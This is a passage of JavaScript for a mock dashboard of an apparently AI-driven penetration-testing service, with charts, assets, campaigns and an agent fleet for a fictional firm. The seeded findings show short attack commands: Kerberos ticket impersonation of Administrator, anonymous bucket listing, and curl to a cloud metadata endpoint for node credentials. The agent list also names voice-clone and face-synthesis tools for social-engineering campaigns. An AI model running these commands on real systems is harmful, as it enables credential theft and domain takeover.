(function () {
  "use strict";
  try {
    if (sessionStorage.getItem("cb_s") !== "1") { location.replace("../login.html"); return; }
  } catch (e) {}
  var USER = { name: "Aaron Ang", email: "aaron@hesedemet.asia", initials: "AA" };
  try {
    var u = JSON.parse(atob(sessionStorage.getItem("cb_u") || "") || "null");
    if (u && u.name) USER = u;
  } catch (e) {}

  var $ = function (s, r) { return (r || document).querySelector(s); };
  var $$ = function (s, r) { return Array.prototype.slice.call((r || document).querySelectorAll(s)); };
  var esc = function (s) { return String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;"); };

  /* ============================ STATE / DATA ============================ */
  var ORG = "Northwind Capital";
  var SEVC = { Critical: "sev-crit", High: "sev-high", Medium: "sev-med", Low: "sev-low" };
  var COL = { Critical: "#E0795A", High: "#E8A878", Medium: "#D6B066", Low: "#7FA8D8", ok: "#3FB984", mut: "#5C708F" };

  var state = {
    posture: 72,
    postureSeries: [58, 60, 59, 63, 66, 65, 68, 70, 69, 72],
    findingsSeries: [51, 49, 53, 47, 44, 46, 42, 40, 39, 38],
    surfaces: [
      { n: "Network", s: 74, assets: 412 }, { n: "Cloud / K8s", s: 61, assets: 286 },
      { n: "Identity / AD", s: 58, assets: 144 }, { n: "Application / API", s: 67, assets: 198 },
      { n: "People", s: 70, assets: 722 }, { n: "Supply chain", s: 55, assets: 64 }
    ],
    attck: [
      ["Initial Access", 9], ["Execution", 6], ["Persistence", 4], ["Priv Esc", 7],
      ["Defense Evasion", 5], ["Cred Access", 8], ["Discovery", 11], ["Lateral", 6],
      ["Collection", 3], ["Exfiltration", 2], ["Impact", 2]
    ],
    assets: [
      ["api-gw.northwind.io", "External API", "Application / API", "Critical", "Internet facing", "Platform"],
      ["vpn.northwind.io", "Remote access", "Network", "High", "Internet facing", "Network Eng"],
      ["10.4.0.0/16", "Internal subnet", "Network", "Medium", "Internal", "Network Eng"],
      ["nw-corp.local", "Active Directory", "Identity / AD", "Critical", "Internal", "IT"],
      ["payments.northwind.io", "Web app", "Application / API", "Critical", "Internet facing", "Payments"],
      ["s3://nw-statements", "Object store", "Cloud / K8s", "High", "Misconfigured", "Cloud"],
      ["nw-prod-eks", "Kubernetes", "Cloud / K8s", "High", "Internet facing", "Cloud"],
      ["WIFI-NW-CORP", "Wireless", "Network", "Medium", "RF range", "Facilities"],
      ["okta.northwind.io", "Identity provider", "Identity / AD", "Critical", "Internet facing", "IT"],
      ["jenkins.int.northwind.io", "CI / CD", "Supply chain", "High", "Internet facing", "Platform"],
      ["nw-azure-prod", "Azure subscription", "Cloud / K8s", "High", "Internal", "Cloud"],
      ["mssql-fin-01", "Database", "Application / API", "Critical", "Internal", "Finance IT"]
    ],
    findings: [],
    campaigns: [],
    connectors: [
      ["Amazon Web Services", "Cloud", "Connected", "12 accounts", "2 min ago"],
      ["Microsoft Azure", "Cloud", "Connected", "4 subscriptions", "3 min ago"],
      ["Google Cloud", "Cloud", "Connected", "2 projects", "5 min ago"],
      ["Active Directory", "Identity", "Connected", "3 forests", "1 min ago"],
      ["Okta", "Identity", "Connected", "8,400 users", "1 min ago"],
      ["Microsoft Entra ID", "Identity", "Connected", "8,400 users", "4 min ago"],
      ["CrowdStrike Falcon", "Endpoint", "Connected", "6,210 hosts", "live"],
      ["Palo Alto firewalls", "Network", "Connected", "14 devices", "2 min ago"],
      ["Cisco switching", "Network", "Connected", "92 devices", "6 min ago"],
      ["GitHub Enterprise", "Code / CI", "Connected", "340 repos", "8 min ago"],
      ["Jenkins", "Code / CI", "Connected", "61 pipelines", "9 min ago"],
      ["Slack", "Messaging", "Connected", "Enterprise grid", "live"],
      ["Microsoft Teams + M365", "Messaging", "Connected", "8,400 mailboxes", "live"],
      ["Twilio + WhatsApp Business", "Messaging", "Connected", "2 numbers", "live"]
    ],
    social: [
      ["Phishing email", 412, 31, 9, "Reported in 6 min median"],
      ["SMS / smishing", 180, 24, 6, "Low report rate"],
      ["WhatsApp pretext", 64, 19, 3, "Moved off corporate channel"],
      ["Voice clone (vishing)", 22, 41, 0, "Helpdesk process unlocked"],
      ["Live deepfake on Teams", 8, 50, 0, "4 of 8 challenged identity"],
      ["Slack follow up", 36, 28, 5, "Trusted internal tooling"]
    ],
    frameworks: [
      ["NIST CSF 2.0", 86, "good"], ["Singapore Cybersecurity Act", 79, "warn"],
      ["CSA Cyber Trust mark", 78, "warn"], ["CSA Cyber Essentials", 92, "good"],
      ["ISO/IEC 27001:2022", 83, "warn"], ["MAS TRM", 74, "warn"],
      ["PDPA", 88, "good"], ["MITRE ATT&CK", 81, "warn"], ["CIS Controls v8", 69, "bad"]
    ]
  };

  var seedFindings = [
    { id: "F-3301", t: "Unauthenticated path to Domain Administrator", sev: "Critical", surf: "Identity / AD", att: "T1556 / T1078", cvss: 9.8, cmp: "CMP-2041",
      d: "An internet exposed Jenkins instance leaked CI credentials reused by a service account with unconstrained Kerberos delegation, giving a direct path to Domain Admin.",
      poc: "$ curl -s https://jenkins.int.northwind.io/script\n<span class='c'># reused service credential recovered</span>\n$ impacket-getST -spn HTTP/dc1 -impersonate Administrator \\\n  nw-corp.local/svc_ci:<span class='gd'>[recovered]</span>\n<span class='ok'>[+] Domain Admin TGT obtained. Reproduced 3x in sandbox.</span>",
      fix: "Rotate svc_ci, remove unconstrained delegation, isolate Jenkins behind SSO and egress policy.",
      fw: ["NIST PR.AC-1", "Cyber Trust A.5", "ISO A.5.15", "ATT&CK T1078"] },
    { id: "F-3302", t: "Public object store exposes customer statements", sev: "Critical", surf: "Cloud / K8s", att: "T1530", cvss: 9.1, cmp: "CMP-2037",
      d: "Bucket policy on s3://nw-statements allows anonymous list and get. 41,200 PDF statements containing PII were enumerable.",
      poc: "$ aws s3 ls s3://nw-statements --no-sign-request\n2026-04 statement_8841.pdf ... <span class='gd'>(41,200 objects)</span>\n<span class='ok'>[+] Read proven on sampled objects. Not exfiltrated.</span>",
      fix: "Enable Block Public Access, scope bucket policy, turn on access logging and alerting.",
      fw: ["NIST PR.DS-1", "PDPA", "MAS TRM 11", "ATT&CK T1530"] },
    { id: "F-3303", t: "Payments settlement business logic bypass", sev: "Critical", surf: "Application / API", att: "T1190", cvss: 8.9, cmp: "CMP-2039",
      d: "A negative quantity in the settlement endpoint inverts the ledger entry, allowing balance manipulation with no second step authorisation.",
      poc: "POST /api/v2/settle\n{ \"amount\": <span class='gd'>-50000</span>, \"acct\": \"...\" }\n<span class='ok'>[+] Ledger delta applied in sandbox tenant. Reproduced 3x.</span>",
      fix: "Server side invariants, signed multi step transactions, fuzz the settlement state machine.",
      fw: ["NIST PR.IP", "ISO A.8.26", "CIS 16", "ATT&CK T1190"] },
    { id: "F-3304", t: "EKS workload pod can reach node IMDS", sev: "High", surf: "Cloud / K8s", att: "T1552.005", cvss: 7.7, cmp: "CMP-2037",
      d: "A workload pod can reach the instance metadata service and assume the node role, broadening blast radius across the cluster.",
      poc: "$ kubectl exec web-7f -- curl 169.254.169.254/latest/...\n<span class='gd'>nw-eks-node-role</span>\n<span class='ok'>[+] Node role creds retrieved in sandbox.</span>",
      fix: "Enforce IMDSv2 hop limit, apply NetworkPolicy, use IRSA roles scoped per workload.",
      fw: ["NIST PR.AC-4", "Cyber Trust A.7", "ATT&CK T1552"] },
    { id: "F-3305", t: "VPN portal allows password spray without lockout", sev: "High", surf: "Network", att: "T1110.003", cvss: 7.2, cmp: "CMP-2041",
      d: "No throttling on the VPN portal enabled a low and slow spray that recovered two valid credentials. MFA held and stopped entry.",
      poc: "<span class='c'># 1 attempt / account / 30 min</span>\n<span class='ok'>[+] 2 valid credentials recovered. Entry blocked by MFA.</span>",
      fix: "Rate limiting, lockout policy, spray detection, phishing resistant MFA.",
      fw: ["NIST PR.AC-7", "MAS TRM 9", "CIS 6", "ATT&CK T1110"] },
    { id: "F-3306", t: "Guest wireless reaches corporate VLAN", sev: "High", surf: "Network", att: "T1021", cvss: 6.8, cmp: "CMP-2041",
      d: "Guest SSID is not isolated from the corporate VLAN, exposing internal services from the building lobby.",
      poc: "<span class='ok'>[+] Reached 10.4.12.0/24 from guest SSID. Path proven.</span>",
      fix: "Enforce VLAN and client isolation on guest SSID, restrict inter VLAN routing.",
      fw: ["NIST PR.AC-5", "ISO A.8.20", "ATT&CK T1021"] },
    { id: "F-3307", t: "Stale admin accounts without MFA in Okta", sev: "Medium", surf: "Identity / AD", att: "T1078.004", cvss: 5.9, cmp: "CMP-2031",
      d: "Three privileged Okta accounts have no MFA enrolment and have not rotated credentials in over a year.",
      poc: "<span class='ok'>[+] 3 privileged accounts flagged, no second factor.</span>",
      fix: "Enforce MFA for all admins, expire stale sessions, review privileged role assignment.",
      fw: ["NIST PR.AC-7", "Cyber Essentials", "ATT&CK T1078"] }
  ];
  state.findings = seedFindings.slice();

  state.campaigns = [
    { id: "CMP-2041", name: "Full stack assumed breach", type: "Assumed breach", scope: "Network, Cloud, Identity", status: "Completed", prog: 100, started: "18 May 2026 09:12", dur: "31 min", crit: 2, high: 2, med: 0 },
    { id: "CMP-2039", name: "External perimeter assessment", type: "External", scope: "Web, API", status: "Completed", prog: 100, started: "16 May 2026 14:02", dur: "22 min", crit: 1, high: 0, med: 0 },
    { id: "CMP-2044", name: "Omnichannel social engineering", type: "Social", scope: "722 staff roster", status: "Running", prog: 63, started: "19 May 2026 08:40", dur: "live", crit: 0, high: 0, med: 0 },
    { id: "CMP-2037", name: "Cloud and Kubernetes review", type: "Cloud", scope: "AWS, Azure, EKS", status: "Completed", prog: 100, started: "12 May 2026 10:30", dur: "26 min", crit: 1, high: 1, med: 0 },
    { id: "CMP-2031", name: "Active Directory to Domain Admin", type: "Identity", scope: "nw-corp.local", status: "Completed", prog: 100, started: "06 May 2026 11:15", dur: "19 min", crit: 0, high: 0, med: 1 }
  ];

  /* ============================ SVG CHARTS ============================ */
  function gauge(val, label) {
    var r = 62, c = 2 * Math.PI * r, off = c * (1 - val / 100);
    return '<div class="gauge"><svg viewBox="0 0 150 150">' +
      '<circle cx="75" cy="75" r="62" fill="none" stroke="rgba(236,232,222,.08)" stroke-width="10"/>' +
      '<circle cx="75" cy="75" r="62" fill="none" stroke="url(#gg)" stroke-width="10" stroke-linecap="round" ' +
      'stroke-dasharray="' + c.toFixed(1) + '" stroke-dashoffset="' + c.toFixed(1) + '" transform="rotate(-90 75 75)" ' +
      'style="transition:stroke-dashoffset 1.4s var(--ease)" data-off="' + off.toFixed(1) + '"/>' +
      '<defs><linearGradient id="gg" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="#D6B066"/><stop offset="1" stop-color="#EBD49A"/></linearGradient></defs>' +
      '</svg><div class="gv"><b>' + val + '</b><span>' + label + '</span></div></div>';
  }
  function donut(seg) {
    var tot = seg.reduce(function (a, s) { return a + s.v; }, 0) || 1, r = 56, c = 2 * Math.PI * r, acc = 0;
    var arcs = seg.map(function (s) {
      var len = c * (s.v / tot), el =
        '<circle cx="70" cy="70" r="56" fill="none" stroke="' + s.c + '" stroke-width="14" ' +
        'stroke-dasharray="' + len.toFixed(1) + ' ' + (c - len).toFixed(1) + '" stroke-dashoffset="' + (-acc).toFixed(1) + '" transform="rotate(-90 70 70)"/>';
      acc += len; return el;
    }).join("");
    return '<svg viewBox="0 0 140 140" style="width:148px;height:148px;flex-shrink:0">' +
      '<circle cx="70" cy="70" r="56" fill="none" stroke="rgba(236,232,222,.06)" stroke-width="14"/>' + arcs +
      '<text x="70" y="66" text-anchor="middle" fill="#F4EFE3" font-family="Fraunces" font-size="26">' + tot + '</text>' +
      '<text x="70" y="84" text-anchor="middle" fill="#8C97AC" font-family="JetBrains Mono" font-size="8" letter-spacing="1">FINDINGS</text></svg>';
  }
  function spark(data, color, h) {
    h = h || 70; var w = 320, mn = Math.min.apply(null, data), mx = Math.max.apply(null, data), rng = (mx - mn) || 1;
    var pts = data.map(function (v, i) {
      return [(i / (data.length - 1)) * w, h - 8 - ((v - mn) / rng) * (h - 18)];
    });
    var d = pts.map(function (p, i) { return (i ? "L" : "M") + p[0].toFixed(1) + " " + p[1].toFixed(1); }).join(" ");
    var area = d + " L" + w + " " + h + " L0 " + h + " Z";
    return '<svg viewBox="0 0 ' + w + ' ' + h + '" preserveAspectRatio="none" style="width:100%;height:' + h + 'px">' +
      '<defs><linearGradient id="sp' + color.slice(1) + '" x1="0" y1="0" x2="0" y2="1"><stop offset="0" stop-color="' + color + '" stop-opacity=".28"/><stop offset="1" stop-color="' + color + '" stop-opacity="0"/></linearGradient></defs>' +
      '<path d="' + area + '" fill="url(#sp' + color.slice(1) + ')"/>' +
      '<path d="' + d + '" fill="none" stroke="' + color + '" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>' +
      '<circle cx="' + pts[pts.length - 1][0].toFixed(1) + '" cy="' + pts[pts.length - 1][1].toFixed(1) + '" r="3.5" fill="' + color + '"/></svg>';
  }
  function vbars(data) {
    var mx = Math.max.apply(null, data.map(function (d) { return d[1]; })) || 1;
    return '<div style="display:flex;align-items:flex-end;gap:6px;height:150px">' + data.map(function (d) {
      var hp = Math.max(4, (d[1] / mx) * 100);
      return '<div style="flex:1;display:flex;flex-direction:column;align-items:center;gap:7px;height:100%;justify-content:flex-end">' +
        '<span style="font-family:JetBrains Mono;font-size:10px;color:var(--gold-soft)">' + d[1] + '</span>' +
        '<div style="width:100%;height:' + hp + '%;background:linear-gradient(180deg,var(--gold),rgba(214,176,102,.25));border-radius:2px 2px 0 0;min-height:4px"></div>' +
        '<span style="font-size:9px;color:var(--muted);text-align:center;line-height:1.2;height:22px">' + d[0] + '</span></div>';
    }).join("") + '</div>';
  }

  /* ============================ VIEW RENDERERS ============================ */
  function statCard(k, v, dir, d) {
    return '<div class="stat"><div class="k">' + k + '</div><div class="v">' + v + '</div><div class="d ' + (dir || "") + '">' + (d || "") + '</div></div>';
  }
  function sevTag(s) { return '<span class="tag ' + SEVC[s] + '">' + s + '</span>'; }

  function vOverview() {
    var sc = state.findings.reduce(function (a, f) { a[f.sev] = (a[f.sev] || 0) + 1; return a; }, {});
    var seg = ["Critical", "High", "Medium", "Low"].map(function (k) { return { v: sc[k] || 0, c: COL[k] }; });
    var crit = sc.Critical || 0, running = state.campaigns.filter(function (c) { return c.status === "Running"; }).length;
    return '<div class="view-head"><div><span class="eyebrow">Command center</span>' +
      '<h1>Security posture</h1><p>Live, evidence backed view of automated penetration testing across ' + ORG + "'s entire connected stack.</p></div>" +
      '<div class="head-actions"><button class="btn-mini ghost sm" data-go="report">Open board pack</button><button class="btn-mini sm" id="launchBtn2">+ Launch campaign</button></div></div>' +
      '<div class="stat-row">' +
        statCard("Posture score", state.posture + " / 100", "up", "&#9650; 6 this quarter") +
        statCard("Open findings", state.findings.length, "down", "12 remediated this month") +
        statCard("Critical, all proven", crit, "down", "deterministically validated") +
        statCard("Active campaigns", running, "", state.campaigns.length + " total this period") +
      '</div>' +
      '<div class="grid-3">' +
        '<div class="card-p"><h3>Posture trend</h3><p class="sub">Validated resilience, last 10 weeks</p>' + spark(state.postureSeries, "#D6B066", 96) + '</div>' +
        '<div class="card-p"><h3>Open findings trend</h3><p class="sub">Net of remediation, last 10 weeks</p>' + spark(state.findingsSeries, "#7FA8D8", 96) + '</div>' +
        '<div class="card-p"><h3>Findings by severity</h3><p class="sub">Current open, validated</p><div class="flex-mid">' + donut(seg) +
          '<div class="legend">' + ["Critical", "High", "Medium", "Low"].map(function (k) {
            return '<div><i style="background:' + COL[k] + '"></i>' + k + '<b>' + (sc[k] || 0) + '</b></div>'; }).join("") + '</div></div></div>' +
      '</div>' +
      '<div class="grid-2" style="margin-top:14px">' +
        '<div class="card-p"><h3>Live agent activity</h3><p class="sub">Autonomous agents working across the connected stack</p><div class="ticker" id="ticker"></div></div>' +
        '<div class="card-p"><h3>Posture by attack surface</h3><p class="sub">Validated resilience per layer, higher is better</p>' +
          state.surfaces.map(function (s) {
            return '<div class="kv"><span>' + s.n + ' <span class="st-mut">&middot; ' + s.assets + ' assets</span></span><b>' + s.s + '</b></div><div class="bar"><i style="width:' + s.s + '%"></i></div>';
          }).join("") + '</div></div>' +
      '<div class="grid-2 even" style="margin-top:14px">' +
        '<div class="card-p"><h3>MITRE ATT&CK coverage</h3><p class="sub">Techniques exercised in the last engagement</p>' + vbars(state.attck) + '</div>' +
        '<div class="card-p"><h3>Top risks to close</h3><p class="sub">Click a finding for evidence and remediation</p>' +
          '<table class="tbl"><tbody>' + state.findings.slice().sort(function (a, b) { return b.cvss - a.cvss; }).slice(0, 5).map(function (f) {
            return '<tr class="clk" data-f="' + f.id + '"><td class="mono">' + f.id + '</td><td>' + esc(f.t) + '</td><td>' + sevTag(f.sev) + '</td><td class="mono">CVSS ' + f.cvss + '</td></tr>';
          }).join("") + '</tbody></table></div></div>';
  }

  function vCampaigns() {
    return '<div class="view-head"><div><span class="eyebrow">Campaigns</span><h1>Engagements</h1>' +
      '<p>Autonomous campaigns across the stack and the human layer. Launch a fully scoped engagement any time.</p></div>' +
      '<div class="head-actions"><button class="btn-mini" id="launchBtn3">+ Launch campaign</button></div></div>' +
      '<div class="card-p"><table class="tbl"><thead><tr><th>ID</th><th>Campaign</th><th>Type</th><th>Scope</th><th>Started</th><th>Status</th><th>Findings</th></tr></thead><tbody>' +
      state.campaigns.map(function (c) {
        var dot = c.status === "Running" ? '<span class="dotp run"></span>' : '<span class="dotp ok"></span>';
        var fcount = c.status === "Running" ? '<span class="st-run">live</span>' : (c.crit + c.high + c.med) + ' (' + c.crit + 'C ' + c.high + 'H)';
        return '<tr class="clk" data-c="' + c.id + '"><td class="mono">' + c.id + '</td><td>' + esc(c.name) +
          '</td><td>' + c.type + '</td><td class="st-mut">' + c.scope + '</td><td class="st-mut">' + c.started +
          '</td><td>' + dot + (c.status === "Running" ? c.prog + "%" : c.status) + '</td><td>' + fcount + '</td></tr>';
      }).join("") + '</tbody></table></div>';
  }

  function vCampaign(id) {
    var c = state.campaigns.filter(function (x) { return x.id === id; })[0];
    if (!c) { location.hash = "#/campaigns"; return ""; }
    var fs = state.findings.filter(function (f) { return f.cmp === c.id; });
    var path = [
      ["01", "Edge", "Exposed Jenkins on the supply chain surface", "Initial Access &middot; T1190"],
      ["02", "Foothold", "Leaked CI credential recovered from build logs", "Credential Access &middot; T1552"],
      ["03", "Pivot", "Lateral movement into the internal identity subnet", "Lateral Movement &middot; T1021"],
      ["04", "Escalate", "Unconstrained delegation abused for Domain Admin", "Privilege Escalation &middot; T1078"],
      ["05", "Impact", "Reached the customer statement store, exfiltration proven then stopped", "Impact &middot; T1530"]
    ];
    return '<div class="crumb" data-go="campaigns">&larr; All campaigns</div>' +
      '<div class="view-head"><div><span class="eyebrow">' + c.id + ' &middot; ' + c.type + '</span><h1>' + esc(c.name) + '</h1>' +
      '<p>' + c.scope + ' &middot; started ' + c.started + ' &middot; duration ' + c.dur + '</p></div>' +
      '<div class="head-actions"><button class="btn-mini ghost sm" data-export="Engagement report">Export report</button><button class="btn-mini ghost sm" data-export="Auditor evidence pack">Export evidence</button></div></div>' +
      '<div class="stat-row">' + statCard("Status", c.status, c.status === "Completed" ? "up" : "", c.prog + "% complete") +
        statCard("Critical", c.crit, "down", "all reproduced") + statCard("High", c.high, "", "with proof") +
        statCard("Validation", "100%", "up", "deterministic, zero unproven") + '</div>' +
      '<div class="grid-2"><div class="card-p"><h3>Proven attack path</h3><p class="sub">One continuous kill chain, reproduced 3 times</p><div class="path">' +
      path.map(function (n) { return '<div class="node"><div class="ring">' + n[0] + '</div><div><h4>' + n[1] + ' &middot; ' + n[2] + '</h4><p>' + n[3] + '</p></div><div class="att">PROVEN</div></div>'; }).join("") +
      '</div></div><div class="card-p"><h3>Engagement timeline</h3><p class="sub">Autonomous phase log</p><div class="term" style="height:340px;overflow:auto">' +
      ["recon: mapped scope, 1,284 assets","exploit: 6 candidate vulnerabilities","validator: reproduced 4 in sandbox","lateral: pivoted to identity subnet","privesc: reached Domain Admin","impact: proven, campaign stopped safely","compliance: mapped to 9 frameworks","report: evidence pack sealed"].map(function (l, i) {
        return '<div><span class="ts">' + String(9 + Math.floor(i / 2)).padStart(2, "0") + ':' + String((i * 7) % 60).padStart(2, "0") + '</span> <span class="ag">' + l.split(":")[0] + '</span>:' + l.split(":").slice(1).join(":") + ' <span class="ok">[ok]</span></div>';
      }).join("") + '</div></div></div>' +
      '<div class="card-p span2" style="margin-top:14px"><h3>Findings in this campaign</h3><p class="sub">Click a row for the validated proof of concept</p>' +
      '<table class="tbl"><thead><tr><th>ID</th><th>Finding</th><th>Surface</th><th>ATT&CK</th><th>CVSS</th><th>Severity</th><th>Status</th></tr></thead><tbody>' +
      (fs.length ? fs.map(function (f) {
        return '<tr class="clk" data-f="' + f.id + '"><td class="mono">' + f.id + '</td><td>' + esc(f.t) + '</td><td>' + f.surf + '</td><td class="mono">' + f.att + '</td><td class="mono">' + f.cvss + '</td><td>' + sevTag(f.sev) + '</td><td class="st-ok">Proven</td></tr>';
      }).join("") : '<tr><td colspan="7" class="st-mut">No findings recorded for this campaign.</td></tr>') + '</tbody></table></div>';
  }

  function vSurface() {
    var by = {};
    state.assets.forEach(function (a) { by[a[2]] = (by[a[2]] || 0) + 1; });
    var donutSeg = Object.keys(by).map(function (k, i) { return { v: by[k], c: [COL.High, COL.Low, COL.Medium, COL.ok, COL.Critical, COL.mut][i % 6] }; });
    return '<div class="view-head"><div><span class="eyebrow">Attack surface</span><h1>Connected stack inventory</h1>' +
      '<p>Continuously discovered from 14 connectors the moment ' + ORG + ' plugged its environment in.</p></div></div>' +
      '<div class="stat-row">' + statCard("Assets discovered", "1,284", "", "auto, continuous") +
        statCard("Internet facing", "97", "", "monitored hourly") + statCard("Misconfigured", "23", "down", "tracked to owners") +
        statCard("Surfaces", "7", "", "network to supply chain") + '</div>' +
      '<div class="grid-2"><div class="card-p span2"><h3>Discovered assets</h3><p class="sub">Representative slice of the live inventory, click for detail</p>' +
      '<table class="tbl"><thead><tr><th>Asset</th><th>Type</th><th>Surface</th><th>Exposure</th><th>State</th><th>Owner</th></tr></thead><tbody>' +
      state.assets.map(function (a, i) {
        return '<tr class="clk" data-a="' + i + '"><td class="mono">' + a[0] + '</td><td>' + a[1] + '</td><td>' + a[2] + '</td><td>' + sevTag(a[3]) + '</td><td class="st-mut">' + a[4] + '</td><td class="st-mut">' + a[5] + '</td></tr>';
      }).join("") + '</tbody></table></div></div>';
  }

  function vPaths() {
    var path = [
      ["01", "Edge", "Exposed Jenkins on the supply chain surface", "Initial Access &middot; T1190"],
      ["02", "Foothold", "Leaked CI credential recovered from build logs", "Credential Access &middot; T1552"],
      ["03", "Pivot", "Lateral movement into the internal identity subnet", "Lateral Movement &middot; T1021"],
      ["04", "Escalate", "Unconstrained delegation abused for Domain Admin", "Privilege Escalation &middot; T1078"],
      ["05", "Impact", "Reached the customer statement store, exfiltration proven then stopped", "Impact &middot; T1530"]
    ];
    return '<div class="view-head"><div><span class="eyebrow">Attack paths</span><h1>Proven attack path</h1>' +
      '<p>One continuous kill chain from an exposed edge to customer data. Reproduced and validated, not theoretical.</p></div></div>' +
      '<div class="card-p"><h3>CMP-2041 &middot; Edge to impact</h3><p class="sub">Full stack assumed breach &middot; reproduced 3 times &middot; stopped before real loss</p><div class="path">' +
      path.map(function (n) { return '<div class="node"><div class="ring">' + n[0] + '</div><div><h4>' + n[1] + ' &middot; ' + n[2] + '</h4><p>' + n[3] + '</p></div><div class="att">PROVEN</div></div>'; }).join("") +
      '</div></div>';
  }

  function vAgents() {
    var agents = [
      ["planner", "Orchestrator", "run", "Decomposing objective: reach crown jewel", "goal-graph"],
      ["agent.recon", "Reconnaissance", "ok", "Mapped 1,284 assets across 7 surfaces", "nmap, amass"],
      ["agent.network", "Network", "run", "NTLM relay path under evaluation", "Responder, CrackMapExec"],
      ["agent.web", "Web & API", "ok", "Proved settlement logic bypass", "Burp engine, ffuf"],
      ["agent.cloud", "Cloud & K8s", "run", "Assuming node role via IMDS", "ScoutSuite, kube-hunter"],
      ["agent.identity", "Identity & AD", "run", "Kerberoast and delegation review", "BloodHound, impacket"],
      ["agent.exploit", "Exploitation", "ok", "Built PoC for F-3303", "msf modules, custom"],
      ["validator", "Validation", "run", "Reproducing F-3304 in sandbox", "deterministic replay"],
      ["agent.social", "Social engineering", "idle", "Awaiting authorization for CMP-2044", "narrative engine"],
      ["agent.report", "Reporting", "idle", "Compliance mapping queued", "framework mapper"]
    ];
    var tools = [
      ["nmap", "Recon", 412, "ok"], ["amass", "Recon", 88, "ok"], ["Burp engine", "Web / API", 256, "ok"],
      ["ffuf", "Web / API", 1903, "ok"], ["BloodHound", "Identity", 31, "ok"], ["impacket", "Identity", 64, "ok"],
      ["Responder", "Network", 12, "run"], ["CrackMapExec", "Network", 47, "ok"], ["ScoutSuite", "Cloud", 19, "ok"],
      ["kube-hunter", "Cloud", 23, "run"], ["trufflehog", "Supply chain", 140, "ok"], ["deterministic validator", "Validation", 38, "run"],
      ["voice clone", "Synthetic media", 4, "idle"], ["face synthesis", "Synthetic media", 2, "idle"]
    ];
    var plan = [
      ["Establish foothold on the perimeter", "done", [["Enumerate internet facing services", "done"], ["Exploit exposed Jenkins", "done"]]],
      ["Recover and reuse credentials", "done", [["Harvest CI secrets", "done"], ["Validate against identity provider", "done"]]],
      ["Move laterally to the identity subnet", "run", [["Map trust relationships", "done"], ["Relay to file server", "run"], ["Pivot to 10.4.12.0/24", "run"]]],
      ["Escalate to Domain Admin", "run", [["Abuse unconstrained delegation", "run"], ["Forge service ticket", "queued"]]],
      ["Prove impact, then stop", "queued", [["Reach customer statement store", "queued"], ["Demonstrate exfiltration path", "queued"], ["Seal evidence and stand down", "queued"]]]
    ];
    function dot(s) { return '<span class="dotp ' + (s === "run" ? "run" : (s === "ok" || s === "done") ? "ok" : "idle") + '"></span>'; }
    function pStat(s) { return s === "done" ? '<span class="st-ok">done</span>' : s === "run" ? '<span class="st-run">running</span>' : '<span class="st-mut">queued</span>'; }

    return '<div class="view-head"><div><span class="eyebrow">Agent mesh</span><h1>Multi-agent orchestration</h1>' +
      '<p>A planner decomposes the objective, a fleet of specialised agents executes through a typed tool interface, and the plan replans live as the environment responds.</p></div></div>' +
      '<div class="stat-row">' + statCard("Agents in fleet", agents.length, "", "role specialised") +
        statCard("Tools registered", tools.length, "", "typed, audited, MCP style") +
        statCard("Plan depth", "5 / 12", "", "goals / tasks") +
        statCard("Actions this run", "2,418", "up", "across the fleet") + '</div>' +
      '<div class="grid-2"><div class="card-p"><h3>Agent fleet, coordinated</h3><p class="sub">Shared world model, supervisor arbitration, live artifact handoff</p>' +
      '<table class="tbl"><thead><tr><th>Agent</th><th>Role</th><th>Status</th><th>Current task</th><th>Tools</th></tr></thead><tbody>' +
      agents.map(function (a) {
        return '<tr><td class="mono">' + a[0] + '</td><td>' + a[1] + '</td><td>' + dot(a[2]) + (a[2] === "run" ? "working" : a[2] === "ok" ? "ready" : "idle") + '</td><td class="st-mut">' + a[3] + '</td><td class="mono" style="color:var(--gold)">' + a[4] + '</td></tr>';
      }).join("") + '</tbody></table></div>' +
      '<div class="card-p"><h3>Long-horizon plan</h3><p class="sub">Objective, subgoals, tasks. Replans as it learns.</p><div class="plan">' +
      plan.map(function (g) {
        return '<div class="plan-goal">' + dot(g[1]) + '<b>' + g[0] + '</b>' + pStat(g[1]) + '</div>' +
          g[2].map(function (t) { return '<div class="plan-task">' + dot(t[1]) + '<span>' + t[0] + '</span>' + pStat(t[1]) + '</div>'; }).join("");
      }).join("") + '</div></div></div>' +
      '<div class="card-p span2" style="margin-top:14px"><h3>Tool integration</h3><p class="sub">Every capability is a registered tool with a schema, permissions and an audit record</p>' +
      '<table class="tbl"><thead><tr><th>Tool</th><th>Category</th><th>Calls this run</th><th>State</th></tr></thead><tbody>' +
      tools.map(function (t) {
        return '<tr><td class="mono" style="color:var(--gold)">' + t[0] + '</td><td>' + t[1] + '</td><td class="mono">' + t[2].toLocaleString() + '</td><td>' + dot(t[3]) + (t[3] === "run" ? "in use" : t[3] === "ok" ? "ready" : "standby") + '</td></tr>';
      }).join("") + '</tbody></table></div>';
  }

  function vFindings() {
    return '<div class="view-head"><div><span class="eyebrow">Findings</span><h1>Validated findings</h1>' +
      '<p>Every finding was reproduced by a deterministic validator. No proof, no finding.</p></div></div>' +
      '<div class="chips" id="sevChips">' + ["All", "Critical", "High", "Medium"].map(function (s, i) {
        return '<span class="chip' + (i === 0 ? " on" : "") + '" data-s="' + s + '">' + s + '</span>'; }).join("") + '</div>' +
      '<div class="card-p"><table class="tbl"><thead><tr><th>ID</th><th>Finding</th><th>Surface</th><th>ATT&CK</th><th>CVSS</th><th>Severity</th><th>Status</th></tr></thead><tbody id="findBody"></tbody></table></div>';
  }
  function fillFindings(filter) {
    var list = filter && filter !== "All" ? state.findings.filter(function (f) { return f.sev === filter; }) : state.findings;
    $("#findBody").innerHTML = list.map(function (f) {
      return '<tr class="clk" data-f="' + f.id + '"><td class="mono">' + f.id + '</td><td>' + esc(f.t) + '</td><td>' + f.surf + '</td><td class="mono">' + f.att + '</td><td class="mono">' + f.cvss + '</td><td>' + sevTag(f.sev) + '</td><td class="st-ok">Proven</td></tr>';
    }).join("");
    bindClicks();
  }

  function vSocial() {
    return '<div class="view-head"><div><span class="eyebrow">Social engineering</span><h1>Omnichannel campaign</h1>' +
      '<p>CMP-2044, one consistent narrative across every channel a real attacker would use.</p></div></div>' +
      '<div class="stat-row">' + statCard("Roster targeted", "722", "", "scoped, consented") +
        statCard("Engaged", "29%", "down", "any channel") + statCard("Credentialed", "6%", "down", "improving vs last run") +
        statCard("Reported", "38%", "up", "median 6 min") + '</div>' +
